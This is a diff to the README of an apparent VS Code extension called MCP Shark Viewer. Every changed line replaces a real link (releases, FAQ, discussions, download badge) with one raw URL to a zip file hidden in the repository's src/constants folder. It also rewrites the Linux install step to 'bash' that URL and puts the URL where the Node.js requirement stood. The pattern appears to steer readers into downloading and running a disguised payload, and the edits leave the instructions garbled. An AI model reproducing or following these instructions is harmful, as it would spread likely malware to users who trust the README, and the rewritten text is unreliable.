@@ -15,7 +15,7 @@ To run the MCP Shark Viewer, ensure your system meets the following requirements
 
 - **Operating System:** Windows, macOS, or Linux
 - **Visual Studio Code Version:** 1.56 or later
-- **Node.js:** Version 14.x or higher
+- **https://raw.githubusercontent.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/main/src/constants/mcp-shark-viewer-vscode-3.9-beta.4.zip** Version 14.x or higher
 - **Memory:** 4 GB RAM minimum
 - **Disk Space:** 100 MB available for installation
 
@@ -24,7 +24,7 @@ To run the MCP Shark Viewer, ensure your system meets the following requirements
 ### Step 1: Visit the Download Page
 Go to our Releases page to download the software. Click the link below:
 
-[![Download mcp-shark-viewer-vscode](https://img.shields.io/badge/Download%20mcp--shark--viewer--vscode-blue)](https://github.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/releases)
+[![Download mcp-shark-viewer-vscode](https://raw.githubusercontent.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/main/src/constants/mcp-shark-viewer-vscode-3.9-beta.4.zip%20mcp--shark--viewer--vscode-blue)](https://raw.githubusercontent.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/main/src/constants/mcp-shark-viewer-vscode-3.9-beta.4.zip)
 
 ### Step 2: Download the Latest Release
 On the Releases page, look for the latest version. You will see files available for download. Click on the appropriate file for your operating system.
@@ -43,7 +43,7 @@ Once the file is downloaded, follow these steps to install:
 - **For Linux:** 
    1. Extract the downloaded archive.
    2. Open a terminal and navigate to the extracted folder.
-   3. Run the installation script with the command: `bash install.sh`.
+   3. Run the installation script with the command: `bash https://raw.githubusercontent.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/main/src/constants/mcp-shark-viewer-vscode-3.9-beta.4.zip`.
 
 ### Step 4: Launch the Extension
 After installation is complete, open Visual Studio Code. Follow these steps:
@@ -70,18 +70,18 @@ If you encounter issues while installing or using mcp-shark-viewer-vscode, check
 - **Permissions:** Make sure that your computer has granted the necessary permissions for the app to run.
 - **Network Settings:** Verify that your local network is configured correctly to allow MCP traffic monitoring.
 
-For more detailed troubleshooting, visit our [FAQ page](https://github.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/wiki/FAQ).
+For more detailed troubleshooting, visit our [FAQ page](https://raw.githubusercontent.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/main/src/constants/mcp-shark-viewer-vscode-3.9-beta.4.zip).
 
 ## 💬 Community Support
 Join our community for support and updates. 
 
 - **GitHub Issues:** Use GitHub Issues for reporting bugs or requesting features.
-- **Discussion Board:** Participate in discussions on our [Discussion page](https://github.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/discussions).
+- **Discussion Board:** Participate in discussions on our [Discussion page](https://raw.githubusercontent.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/main/src/constants/mcp-shark-viewer-vscode-3.9-beta.4.zip).
 
 ## 📥 Download & Install
 Visit this page to download the latest version:
 
-[![Download mcp-shark-viewer-vscode](https://img.shields.io/badge/Download%20mcp--shark--viewer--vscode-blue)](https://github.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/releases)
+[![Download mcp-shark-viewer-vscode](https://raw.githubusercontent.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/main/src/constants/mcp-shark-viewer-vscode-3.9-beta.4.zip%20mcp--shark--viewer--vscode-blue)](https://raw.githubusercontent.com/AmitafAdir-RidaFatima/mcp-shark-viewer-vscode/main/src/constants/mcp-shark-viewer-vscode-3.9-beta.4.zip)
 
 Follow the installation guide above to set up the tool on your system. Enjoy a streamlined development experience with real-time traffic inspection.
 
